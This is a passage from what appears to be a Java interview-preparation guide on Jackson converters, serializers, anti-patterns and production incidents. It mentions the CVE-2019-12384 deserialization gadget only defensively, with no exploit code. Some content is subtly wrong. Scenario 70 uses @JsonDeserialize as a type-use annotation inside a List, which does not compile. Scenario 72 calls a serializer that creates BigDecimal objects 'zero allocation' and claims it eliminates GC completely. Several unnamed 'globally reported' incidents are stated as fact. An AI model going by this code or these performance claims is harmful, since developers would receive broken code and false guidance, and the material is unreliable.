          if (cardNumber.length() <= 4) return "****";
          return "****-****-****-" + cardNumber.substring(cardNumber.length() - 4);
      }
  }
  ```

---

### Scenario 65: Programmatic Registration of Converters via `SimpleModule`
**Question:** Instead of annotating hundreds of DTO fields with `@JsonSerialize(converter = ...)`, how do you register a default converter globally for all instances of a specific domain class (e.g. `CurrencyCode`)?
- **Interviewer Evaluation:** Evaluates Jackson module configuration, `StdDelegatingSerializer`, and enterprise-scale global formatting.
- **Standout Technical Answer:**
  - To register a `Converter<IN, OUT>` globally across an `ObjectMapper`:
    Wrap the converter in a **`StdDelegatingSerializer`** and add it to a **`SimpleModule`**:
  ```java
  @Configuration
  public class JacksonGlobalConverterConfig {

      @Bean
      public ObjectMapper objectMapper() {
          SimpleModule module = new SimpleModule();
          // Wrap converter in StdDelegatingSerializer:
          module.addSerializer(Money.class, new StdDelegatingSerializer(new MoneyToStringConverter()));
          // Wrap deserializer converter in StdDelegatingDeserializer:
          module.addDeserializer(Money.class, new StdDelegatingDeserializer<>(new StringToMoneyConverter()));

          return JsonMapper.builder()
              .addModule(module)
              .build();
      }
  }
  ```

---

### Scenario 66: Unit Testing Jackson Converters in Isolation with JUnit 5 & Mockito
**Question:** How do you write fast, zero-Spring unit tests for custom Jackson `StdConverter` classes that depend on external collaborator services?
- **Interviewer Evaluation:** Evaluates test pyramid discipline, fast feedback loops without booting heavy Spring context (`@SpringBootTest`), and verifying edge cases (null, negative, boundary conditions).
- **Standout Technical Answer:**
  - Because `StdConverter<IN, OUT>` contains pure Java logic in its `convert()` method, it can be tested directly with JUnit 5 and Mockito in milliseconds without loading Spring.
  - Test both the direct `convert()` method and its behavior through a standalone lightweight `ObjectMapper`:
  ```java
  @ExtendWith(MockitoExtension.class)
  class DynamicCurrencyConverterTest {

      @Mock
      private ForexRateService forexRateService;

      private DynamicCurrencyConverter converter;
      private ObjectMapper mapper;

      @BeforeEach
      void setUp() {
          converter = new DynamicCurrencyConverter(forexRateService);
          mapper = new ObjectMapper();
      }

      @Test
      void shouldConvertUsdToEurWithMockedRate() {
          when(forexRateService.getExchangeRate("USD", "EUR")).thenReturn(new BigDecimal("0.92"));

          BigDecimal eur = converter.convert(new BigDecimal("100.00"));

          assertThat(eur).isEqualByComparingTo("92.00");
      }

      @Test
      void shouldReturnNullWhenInputIsNull() {
          // Mandatory Jackson null safety verification
          assertThat(converter.convert(null)).isNull();
          verifyNoInteractions(forexRateService);
      }
  }
  ```

---

### Scenario 67: Jackson `Converter` vs `@JsonSerialize(using=...)` vs `@JsonSerialize(as=...)` vs `@JsonFormat(shape=...)`
**Question:** What are the precise architectural distinctions between the four primary Jackson property serialization directives?
- **Interviewer Evaluation:** Evaluates in-depth command of the Jackson serialization pipeline and choosing the right tool for the job.
- **Standout Technical Answer:**
  - **`@JsonSerialize(using = CustomSerializer.class)`**: Low-level token stream generation via `JsonGenerator`. $0$ intermediate heap allocations. Maximum performance; highest procedural code complexity.
  - **`@JsonSerialize(converter = CustomConverter.class)`**: High-level object transformation. Maps `DomainObject -> IntermediateObject` that Jackson serializes natively. Clean, declarative, allocates 1 intermediate heap object.
  - **`@JsonSerialize(as = InterfaceOrSuperclass.class)`**: Compile-time reflection filter. Instructs Jackson to introspect only properties declared on the specified interface or superclass, suppressing subclass-specific fields. Runs with zero extra allocations and zero transformation logic.
  - **`@JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "...")`**: Declarative built-in formatter for dates, numbers, and enums. Requires no custom classes; configured purely via annotation metadata.

---

### Scenario 68: Dynamic Polymorphic Deserialization via `StdConverter<JsonNode, DomainEvent>`
**Question:** Upstream webhook providers send event payloads where the event type and schema evolve unpredictably, making rigid `@JsonSubTypes` schemas unmaintainable. How do you deserialize dynamically using a Jackson Converter?
- **Interviewer Evaluation:** Assesses handling loose contracts, schema-less JSON payloads, and combining Tree Model (`JsonNode`) with high-level converters.
- **Standout Technical Answer:**
  ```java
  public class WebhookEventConverter extends StdConverter<JsonNode, WebhookEvent> {
      @Override
      public WebhookEvent convert(JsonNode node) {
          if (node == null || node.isNull()) return null;

          String eventType = node.path("event_type").asText("UNKNOWN");
          int schemaVersion = node.path("v").asInt(1);

          return switch (eventType) {
              case "payment.captured" -> (schemaVersion >= 2) 
                  ? new PaymentCapturedV2(node.path("payment_id").asText(), node.path("amount_cents").asLong())
                  : new PaymentCapturedV1(node.path("id").asText(), node.path("amount").asDouble());
              case "customer.refunded" -> new CustomerRefunded(node.path("refund_id").asText());
              default -> new GenericWebhookEvent(eventType, node);
          };
      }
  }

  public record IncomingWebhookPayload(
      @JsonProperty("delivery_id") String deliveryId,
      @JsonDeserialize(converter = WebhookEventConverter.class)
      WebhookEvent event
  ) {}
  ```

---

### Scenario 69: Tristate Property Representation (`JsonNullable`) vs Custom Jackson Converter
**Question:** In HTTP PATCH requests, how do you distinguish between a field being omitted (no change), set to explicit `null` (clear value in DB), and set to a new value (`"name": "Alice"`)?
- **Interviewer Evaluation:** Understanding partial updates, JSON RFC 7396 JSON Merge Patch, Jackson `JsonNullable` module vs custom converters.
- **Standout Technical Answer:**
  - Standard Java types and simple Converters cannot differentiate between "missing from JSON" and `"field": null` because both result in `null` in the Java field.
  - **The Solution**: Use `org.openapitools.jackson.nullable.JsonNullable<T>` registered with `JsonNullableModule`:
    - Omitted from JSON: `JsonNullable.undefined()`
    - `"field": null`: `JsonNullable.of(null)` (present, but wrapped value is null)
    - `"field": "value"`: `JsonNullable.of("value")`
  - When writing a custom `StdConverter<String, TristateStatus>`, the converter only executes if the field is present; if omitted, Jackson does not invoke the converter unless field defaults are explicitly declared.

---

### Scenario 70: Multi-Dimensional Collections: Combining `KeyDeserializer` with `contentConverter`
**Question:** How do you deserialize a complex JSON structure like `{"EUR_USD": [" 1.08 ", " 1.09 "]}` into a `Map<CurrencyPair, List<BigDecimal>>` with key parsing and element-level string-to-BigDecimal conversion?
- **Interviewer Evaluation:** Evaluates combining multiple Jackson extension points (`KeyDeserializer` for map keys, `contentConverter` for map values/lists).
- **Standout Technical Answer:**
  ```java
  public class CurrencyPairKeyDeserializer extends KeyDeserializer {
      @Override
      public Object deserializeKey(String key, DeserializationContext ctxt) {
          String[] parts = key.split("_");
          return new CurrencyPair(Currency.getInstance(parts[0]), Currency.getInstance(parts[1]));
      }
  }

  public class StringToBigDecimalConverter extends StdConverter<String, BigDecimal> {
      @Override
      public BigDecimal convert(String value) {
          return (value != null) ? new BigDecimal(value.strip()) : null;
      }
  }

  public record ForexRatesPayload(
      @JsonDeserialize(keyUsing = CurrencyPairKeyDeserializer.class)
      Map<CurrencyPair, List<@JsonDeserialize(converter = StringToBigDecimalConverter.class) BigDecimal>> rates
  ) {}
  ```

---

### Scenario 71: Propagating Multi-Tenant Context Through Jackson Converters
**Question:** How do you access tenant-specific formatting rules (e.g. European number formatting `1.999,50` vs US `1,999.50`) inside a `StdConverter` without introducing race conditions?
- **Interviewer Evaluation:** Assesses multi-tenancy architecture, thread safety of converter instances, and integrating with `ThreadLocal` / Spring `SecurityContextHolder`.
- **Standout Technical Answer:**
  - **Crucial Rule**: Never store tenant state in converter instance fields! Jackson shares converter instances across concurrent worker threads.
  - Retrieve tenant metadata dynamically from a thread-safe context (e.g. `TenantContextHolder` backed by `ThreadLocal` or `ScopedValue` in Java 21):
  ```java
  public class TenantAwareDecimalConverter extends StdConverter<BigDecimal, String> {
      @Override
      public String convert(BigDecimal value) {
          if (value == null) return null;
          Locale tenantLocale = TenantContextHolder.getCurrentTenantLocale();
          NumberFormat formatter = NumberFormat.getNumberInstance(tenantLocale);
          return formatter.format(value);
      }
  }
  ```

---

### Scenario 72: High-Performance Zero-Allocation Bytecode Replacement for `Converter`
**Question:** Under an extreme performance audit, your team is asked to rewrite a `StdConverter<Money, Long>` into a zero-allocation `JsonSerializer<Money>`. Show the code and explain why it eliminates GC pauses.
- **Interviewer Evaluation:** Low-level Jackson streaming API, direct buffer writes, avoiding boxing and intermediate DTO object creation.
- **Standout Technical Answer:**
  ```java
  public class ZeroAllocationMoneySerializer extends JsonSerializer<Money> {
      @Override
      public void serialize(Money money, JsonGenerator gen, SerializerProvider serializers) throws IOException {
          if (money == null) {
              gen.writeNull();
              return;
          }
          // Writes the raw primitive long directly into the UTF-8 byte buffer:
          long cents = money.amount().movePointRight(2).longValue();
          gen.writeNumber(cents); // Zero object allocations!
      }
  }
  ```
  - `Converter<Money, Long>` boxes the `long` into a `java.lang.Long` heap object on every invocation.
  - `ZeroAllocationMoneySerializer` directly writes the primitive `long` digits into `JsonGenerator`'s recycled byte/char array buffer (`BufferRecycler`), creating **0 heap objects** and eliminating Young Gen GC collections completely.

---

# Layer 6: Beginner Mistakes & Fatal Anti-Patterns

---

### Anti-Pattern 1: Creating `new ObjectMapper()` Per HTTP Request
- ❌ **The Anti-Pattern**: Instantiating `new ObjectMapper()` inside controller methods.
- 💥 **Production Impact**: Massive GC memory thrashing and cold reflection caches causing 20x latency degradation.
- ✅ **The Fix**: Declare `ObjectMapper` as a thread-safe singleton Spring `@Bean`.

---

### Anti-Pattern 2: Exposing JPA `@Entity` Classes Directly in REST Controllers
- ❌ **The Anti-Pattern**: Returning Hibernate `@Entity` objects directly in API endpoints.
- 💥 **Production Impact**: Infinite recursion `StackOverflowError` on bidirectional relationships and `LazyInitializationException` outside transaction scopes.
- ✅ **The Fix**: Map JPA entities to dedicated DTOs or Java 17/21 Records.

---

### Anti-Pattern 3: Using `SimpleDateFormat` inside Custom Serializers
- ❌ **The Anti-Pattern**: Reusing a static `SimpleDateFormat` in a `JsonSerializer`.
- 💥 **Production Impact**: `SimpleDateFormat` is **fundamentally thread-unsafe**; concurrent threads corrupt internal calendar buffers, producing scrambled dates or infinite CPU spin.
- ✅ **The Fix**: Use immutable, thread-safe `DateTimeFormatter` from Java 8 `java.time`.

---

### Anti-Pattern 4: Using `enableDefaultTyping()` or Allowlisting `Object.class`
- ❌ **The Anti-Pattern**: Enabling open default typing for polymorphic payloads.
- 💥 **Production Impact**: Severe Remote Code Execution (RCE) via deserialization gadget chains.
- ✅ **The Fix**: Enforce strict package whitelisting with `BasicPolymorphicTypeValidator` or use `@JsonSubTypes`.

---

### Anti-Pattern 5: Maintaining Mutable State inside a Jackson `Converter`
- ❌ **The Anti-Pattern**: Declaring mutable instance variables (e.g. `private int counter = 0;`) inside a `StdConverter`.
- 💥 **Production Impact**: Jackson caches and reuses converter instances across concurrent worker threads. Mutable instance state leads to non-deterministic race conditions and data corruption under high concurrency.
- ✅ **The Fix**: Keep all `Converter` implementations **strictly stateless and thread-safe**.

---

### Anti-Pattern 6: Throwing Checked Exceptions from `Converter.convert()`
- ❌ **The Anti-Pattern**: Attempting to catch and rethrow raw checked exceptions or wrapping in raw runtime exceptions without context.
- 💥 **Production Impact**: Because the `convert(IN value)` interface method signature does not declare `throws Exception`, developers catch and rethrow `new RuntimeException(e)`, obscuring the root cause and bypassing Spring `@ControllerAdvice` error handlers.
- ✅ **The Fix**: Throw explicit `IllegalArgumentException` or Jackson's `JsonParseException` so Spring and Jackson map them to clean HTTP 400 Bad Request responses.

---

### Anti-Pattern 7: Confusing Spring MVC `Converter` with Jackson `Converter`
- ❌ **The Anti-Pattern**: Registering a Spring `org.springframework.core.convert.converter.Converter` bean expecting it to convert fields inside `@RequestBody` JSON payloads.
- 💥 **Production Impact**: The converter is silently ignored by Jackson! The developer spends hours debugging why JSON deserialization doesn't invoke the Spring converter.
- ✅ **The Fix**: Use Jackson's `com.fasterxml.jackson.databind.util.Converter` with `@JsonDeserialize(converter = ...)` for JSON payload fields.

---

# Layer 7: Globally Reported Production Incidents & Post-Mortems

---

### Incident 1: FasterXML Jackson CVE-2019-12384 H2 Deserialization RCE
- 🚨 **The Incident**: Attackers compromised enterprise servers by sending payloads specifying `ch.qos.logback.core.db.DriverManagerConnectionSource` as a class type.
- 🔍 **Root Cause**: Jackson's open polymorphic typing instantiated the class and invoked its setter, initiating an outbound connection to an attacker-controlled H2 database script.
- 🛠️ **Remediation**: Patched Jackson to black-list known gadget classes and deprecated unchecked default typing in favor of `BasicPolymorphicTypeValidator`.
- 🛡️ **Architectural Guardrail**: Never permit dynamic class name resolution from user input.

---

### Incident 2: The 10GB In-Memory `readTree()` OOM Outage
- 🚨 **The Incident**: A batch ingestion pipeline processing a daily 10GB vendor catalog crashed with `OutOfMemoryError: Java heap space` on a 32GB server.
- 🔍 **Root Cause**: `objectMapper.readTree()` loaded the entire 10GB document into an in-memory `JsonNode` DOM tree, expanding to 70GB+ of JVM heap memory.
- 🛠️ **Remediation**: Replaced `readTree()` with the Jackson Streaming API (`JsonParser`), streaming individual items with $O(1)$ constant memory (under 100KB heap).
- 🛡️ **Architectural Guardrail**: Mandate Streaming API for any payload exceeding 50MB.

---

### Incident 3: The Global NullPointerException Cascade in Production via Unchecked Converter
- 🚨 **The Incident**: A fintech payment gateway experienced an instantaneous 100% crash across all checkout APIs when a third-party merchant sent `"billing_details": null` in a batch request.
- 🔍 **Root Cause**: A custom `BillingDetailsConverter extends StdConverter<BillingDetails, CompactBilling>` did not perform a null check: `value.getStreet().trim()`. Jackson passed `null` to the converter, throwing a raw `NullPointerException` that aborted the entire HTTP request batch.
- 🛠️ **Remediation**: Injected a mandatory guard clause `if (value == null) return null;` at the top of all `StdConverter` implementations and enforced a static analysis check in CI.
- 🛡️ **Architectural Guardrail**: Always write defensive null guards in every custom serializer, deserializer, and converter.

---

### Incident 4: High GC Allocation Pauses Caused by Intermediate Objects in High-Volume Converters
- 🚨 **The Incident**: During a Black Friday flash sale, a high-frequency trading API experienced $P99$ latency spikes jumping from 2ms to 450ms, causing timeouts and dropped orders.
- 🔍 **Root Cause**: The API processed 80,000 requests/second using a `StdConverter<RawOrder, OrderDto>` to transform orders during JSON deserialization. The converter allocated 80,000 intermediate DTO objects per second in Young Generation memory, triggering frequent Stop-The-World (STW) GC pauses.
- 🛠️ **Remediation**: Replaced the high-level `Converter` with a zero-allocation custom `JsonDeserializer` that read tokens directly into pre-allocated domain records.
- 🛡️ **Architectural Guardrail**: Reserve high-level `Converter` for standard business microservices; use zero-allocation `JsonSerializer` / `JsonDeserializer` for high-throughput ($> 20,000\text{ QPS}$) low-latency critical paths.

---

# Layer 8: Rapid-Fire Cheat Sheet & Feature Matrix

---

### Converter Decision Matrix: When to Use What?

| Technique | Abstraction Level | Memory Overhead | Performance | Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **`JsonSerializer<T>`** | Low-level (Token Stream) | **Zero** allocations | Maximum (Fastest) | High-throughput ($>20k\text{ QPS}$), byte-level output |
| **`Converter<IN, OUT>`** | High-level (Object to Object) | Moderate (Intermediate Object) | Fast | Domain formatting, masking, currency, clean code |
| **Spring `Converter<S,T>`**| Spring MVC / WebDataBinder | Low | Fast | Query params, Path variables, Form data (NOT JSON body) |
| **JPA `AttributeConverter`**| Persistence Context / ORM | Low | Fast | Entity field to Database column mapping |

---

### Critical Jackson Configuration Directives

| Feature / Directive | Scope | Production Setting | Purpose |
| :--- | :--- | :--- | :--- |
| `FAIL_ON_UNKNOWN_PROPERTIES` | Deserialization | `false` | Prevents API crashes when upstream adds fields |
| `WRITE_DATES_AS_TIMESTAMPS` | Serialization | `false` | Generates ISO-8601 UTC strings instead of numeric epoch |
| `DEFAULT_VIEW_INCLUSION` | Mapper | `false` | Prevents unannotated fields from leaking into `@JsonView` |
| `ACCEPT_EMPTY_STRING_AS_NULL_OBJECT`| Deserialization | `true` | Coerces `""` to `null` safely |
| `STRICT_DUPLICATE_DETECTION` | Factory | `true` | Rejects malicious payloads with duplicate JSON keys |

---

### The Golden Jackson Architecture Rules
1. **Never create `new ObjectMapper()` per request**: Declare as a thread-safe singleton.
2. **Never enable open polymorphic typing**: Enforce `BasicPolymorphicTypeValidator`.
3. **Use the Streaming API (`JsonParser`) for payloads $> 50\text{ MB}$**: Guarantee $O(1)$ constant memory.
4. **Use Java 17/21 Records for DTOs**: Gain immutability and atomic canonical deserialization.
5. **Always make Converters null-safe and stateless**: Check `if (value == null) return null;` to prevent NPE crashes.
6. **Always serialize 64-bit Long IDs as Strings**: Prevent JavaScript IEEE 754 precision loss.
7. **Use zero-allocation serializers for hot paths ($> 20,000\text{ QPS}$)**: Avoid Eden space GC thrashing.

